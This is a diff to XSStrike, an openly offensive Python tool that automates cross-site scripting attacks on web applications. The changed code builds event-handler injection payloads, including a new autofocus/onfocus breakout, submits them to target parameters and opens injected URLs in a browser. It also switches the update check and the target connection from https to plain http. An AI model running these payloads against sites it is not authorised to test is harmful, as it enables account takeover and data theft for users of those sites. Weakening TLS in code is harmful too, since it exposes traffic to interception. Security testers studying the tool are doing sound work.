@@ -32,11 +32,11 @@ br.set_handle_referer(True) # Include referrer
 br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
 ('Accept-Encoding', 'deflate'), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
 
-date = '20-04-2018'
+date = '08-05-2018'
 
 def update():
     print '%s Checking for updates...' % run
-    xsstrike = br.open('https://github.com/UltimateHackers/XSStrike/blob/master/xsstrike').read()
+    xsstrike = br.open('http://github.com/UltimateHackers/XSStrike/blob/master/xsstrike').read()
     if date not in xsstrike:
         choice = raw_input('%s A new version of XSStrike is available. Would you like to update? [Y/n] ' % que).lower()
         if choice != 'n':
@@ -228,7 +228,7 @@ def filter_checker(url, param_data, GET, POST):
             strength = 'low' # As a malicious payload was not filtered, the filter is weak
         else: # If malicious payload was filtered (was not in the response)
             # Now we will use a less malicious payload
-            medium_string = param_data.replace(xsschecker, quote_plus('<zz//onxx=yy>'))
+            medium_string = param_data.replace(xsschecker, quote_plus('<zz onxx=yy>'))
             sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
             if GET:
                 medium_request = br.open(url + medium_string).read()
@@ -316,7 +316,7 @@ def test_param_check(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, p
                     pass
                 else:
                     if GET:
-                        webbrowser.open(url+param_data.strip(xsschecker)+payload_to_compare)
+                        webbrowser.open(url+param_data.replace(xsschecker, payload_to_compare))
                         quit()
             if occurence_counter == OCCURENCE_NUM:
                 success = True
@@ -529,7 +529,7 @@ def inject(url, param_data, GET, POST):
                                 else:
                                     payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                 test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-        
+            print ''
         elif location == 'script':
             print '%s Trying to break out of %sJavaScript%s context.' % (run, green, end)
             prefixes = ['\'-', '\\\'-', '\\\'-']
@@ -582,6 +582,14 @@ def inject(url, param_data, GET, POST):
                 prefix = '%s>' % quote
                 suffixes = ['<%s' % quote, '<br attr=%s' % quote]
                 progress = 0
+                for e_filling, function in izip(e_fillings, functions):
+                    payload = '%saUTofOCus/oNfoCus%s=%s%s%s' % (quote, e_filling, e_filling, quote, function)
+                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
+                    progress = progress + 1
+                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
+                    sys.stdout.flush()
+                sys.stdout.flush()
+                progress = progress + 1
                 for suffix in suffixes:
                     for tag in tags:
                         for event_handler, compatible in event_handlers.items():
@@ -595,7 +603,7 @@ def inject(url, param_data, GET, POST):
                                     else:
                                         payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-            
+                print ''
             elif quote not in allowed and 'entity' in allowed:
                 prefix = ''
                 # if quote == '\'':
@@ -681,14 +689,15 @@ def initiator(url, GET, POST):
                 filter_checker(url, param_data, GET, POST) # Launces filter checker
                 locater(url, param_data, GET, POST) # Launcher locater
                 if len(occur_number) == 0:
-                    print '%s Executing project HULK for blind XSS Detection' % info
-                    for payload in payloads:
-                        param_data = param_data.replace(xsschecker, payload) # Replaces the xsschecker with payload
-                        print '%s Payload: %s' % (info, payload)
-                        webbrowser.open(url + param_data) # Opens the "injected" URL in browser
-                        next = raw_input('%s Press enter to execute next payload ' % que)
-                        #resetting payload
-                        param_data = param_data.replace(payload, xsschecker)
+                    choice = raw_input('%s Would you like to launch hulk for blind XSS detection? [Y/n] ' % que).lower()
+                    if choice != 'n':
+                        for payload in payloads:
+                            param_data = param_data.replace(xsschecker, payload) # Replaces the xsschecker with payload
+                            print '%s Payload: %s' % (info, payload)
+                            webbrowser.open(url + param_data) # Opens the "injected" URL in browser
+                            next = raw_input('%s Press enter to execute next payload ' % que)
+                            #resetting payload
+                            param_data = param_data.replace(payload, xsschecker)
                 inject(url, param_data, GET, POST) # Launches injector
                 del occur_number[:] # Clears the occur_number list
                 del occur_location[:] # Clears the occur_location list
@@ -758,8 +767,7 @@ def input():
         br.open(target) # Makes request to the target
     except Exception as e: # if it fails, the target is unreachable
         if 'ssl' in str(e).lower():
-            print '%s Unable to verify target\'s SSL certificate.' % bad
-            quit()
+            target = 'http://%s' % target
         else:
             print '%s Unable to connect to the target.' % bad
             quit()
